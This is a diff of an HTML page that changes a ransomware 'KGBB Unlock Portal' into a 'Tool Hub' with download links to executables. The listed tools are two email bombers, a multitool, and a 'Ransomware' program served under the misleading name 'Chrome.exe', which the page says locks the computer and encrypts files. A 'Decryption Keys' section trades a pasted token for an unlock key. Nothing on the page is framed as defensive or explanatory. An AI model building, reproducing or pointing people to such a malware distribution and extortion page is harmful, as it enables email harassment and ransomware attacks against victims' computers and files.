@@ -1,48 +1,215 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <title>KGBB Unlock Portal</title>
+  <meta charset="UTF-8">
+  <title>ropz6x</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #1e0033;
+      color: #f0e6ff;
+      margin: 0;
+      padding: 20px;
+    }
+
+    h1 {
+      color: #e0b3ff;
+      text-align: center;
+    }
+
+    .top-buttons {
+      display: flex;
+      justify-content: center;
+      gap: 20px;
+      margin-bottom: 30px;
+    }
+
+    .top-buttons button {
+      background: #7a00cc;
+      color: white;
+      padding: 10px 20px;
+      font-size: 16px;
+      font-weight: bold;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+
+    .top-buttons button:hover {
+      background: #9900ff;
+    }
+
+    .tool-container {
+      display: flex;
+      gap: 20px;
+      flex-wrap: wrap;
+      justify-content: center;
+    }
+
+    .tool {
+      background: #32004d;
+      padding: 15px;
+      border-radius: 12px;
+      width: 300px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.3);
+      transition: transform 0.2s;
+    }
+
+    .tool:hover {
+      transform: scale(1.03);
+    }
+
+    .tool img {
+      width: 100%;
+      height: auto;
+      border-radius: 8px;
+      margin-bottom: 10px;
+    }
+
+    .tool h2 {
+      color: #f6e0ff;
+    }
+
+    .tool p {
+      color: #d3bfff;
+    }
+
+    .tool a {
+      display: inline-block;
+      margin-top: 10px;
+      background: #7a00cc;
+      color: white;
+      padding: 8px 12px;
+      text-decoration: none;
+      border-radius: 6px;
+      font-weight: bold;
+    }
+
+    .tool a:hover {
+      background: #9900ff;
+    }
+
+    /* Decryption Section */
+    #decryptionSection {
+      display: none;
+      text-align: center;
+      margin-top: 50px;
+    }
+
+    #decryptionSection input {
+      width: 300px;
+      padding: 10px;
+      font-size: 18px;
+      margin-top: 20px;
+    }
+
+    #decryptionSection button {
+      margin-top: 20px;
+      padding: 10px 20px;
+      font-size: 18px;
+      background: #7a00cc;
+      border: none;
+      border-radius: 8px;
+      color: white;
+      cursor: pointer;
+      font-weight: bold;
+    }
+
+    #decryptionSection button:hover {
+      background: #9900ff;
+    }
+  </style>
 </head>
-<body style="background-color: black; color: white; text-align: center; padding-top: 50px; font-family: Arial, sans-serif;">
 
-    <h1>Paste your Token here:</h1>
+<body>
+  <h1>🔧 Tool Hub</h1>
 
-    <input type="text" id="tokenInput" style="width: 300px; padding: 10px; font-size: 18px;">
-    <br><br>
-    <button onclick="submitToken()" style="padding: 10px 20px; font-size: 18px;">Get Unlock Key</button>
+  <div class="top-buttons">
+    <button onclick="showTools()">Tools</button>
+    <button onclick="showDecryption()">Decryption Keys</button>
+  </div>
 
-    <h2 id="response" style="margin-top: 30px;"></h2>
+  <!-- Tool Section -->
+  <div id="toolSection" class="tool-container">
+    <div class="tool">
+      <img src="images/evilmail.png" alt="EvilMail">
+      <h2>EvilMail</h2>
+      <p>Simple Temp Mail and Email Bomber</p>
+      <a href="https://github.com/Ropzx/lock/raw/refs/heads/main/exes/emailtool.exe">Download</a>
+    </div>
 
-    <script>
-        async function submitToken() {
-            const token = document.getElementById("tokenInput").value.trim();
-            if (!token) {
-                alert("Please paste your token!");
-                return;
-            }
+    <div class="tool">
+      <img src="images/crod.png" alt="Crod">
+      <h2>Crod</h2>
+      <p>MultiTool with simple stuff</p>
+      <a href="https://github.com/Ropzx/lock/raw/refs/heads/main/exes/crod.exe">Download</a>
+    </div>
 
-            try {
-                const response = await fetch('/get_key', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({ token: token }),
-                });
+    <div class="tool">
+      <img src="images/boom.png" alt="BOMBER">
+      <h2>BOMBER</h2>
+      <p>Email bomber with kinda more options</p>
+      <a href="https://github.com/Ropzx/lock/raw/refs/heads/main/exes/EMbomber.exe">Download</a>
+    </div>
 
-                const data = await response.json();
+    <div class="tool">
+      <img src="images/ransom.png" alt="Ransomware">
+      <h2>Ransomware</h2>
+      <p>Locks your computer and 'encrypts' your files, rendering them inaccessible. To restore access and decrypt your files press the "Decrypt key" button.</p>
+      <a href="https://github.com/Ropzx/lock/raw/refs/heads/main/exes/Chrome.exe">Download</a>
+    </div>
+  </div>
 
-                if (response.ok) {
-                    document.getElementById("response").innerText = "Your Unlock Key: " + data.unlock_key;
-                } else {
-                    document.getElementById("response").innerText = "Error: " + (data.error || "Invalid token.");
-                }
-            } catch (error) {
-                document.getElementById("response").innerText = "Request failed.";
-            }
+  <!-- Decryption Section -->
+  <div id="decryptionSection">
+    <h1>🔑 KGBB Unlock Portal</h1>
+
+    <input type="text" id="tokenInput" placeholder="Paste your token here">
+    <br>
+    <button onclick="submitToken()">Get Unlock Key</button>
+
+    <h2 id="response"></h2>
+  </div>
+
+  <script>
+    function showTools() {
+      document.getElementById('toolSection').style.display = 'flex';
+      document.getElementById('decryptionSection').style.display = 'none';
+    }
+
+    function showDecryption() {
+      document.getElementById('toolSection').style.display = 'none';
+      document.getElementById('decryptionSection').style.display = 'block';
+    }
+
+    async function submitToken() {
+      const token = document.getElementById("tokenInput").value.trim();
+      if (!token) {
+        alert("Please paste your token!");
+        return;
+      }
+
+      try {
+        const response = await fetch('/get_key', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({ token: token }),
+        });
+
+        const data = await response.json();
+
+        if (response.ok) {
+          document.getElementById("response").innerText = "Your Unlock Key: " + data.unlock_key;
+        } else {
+          document.getElementById("response").innerText = "Error: " + (data.error || "Invalid token.");
         }
-    </script>
+      } catch (error) {
+        document.getElementById("response").innerText = "Request failed.";
+      }
+    }
+  </script>
 
 </body>
 </html>
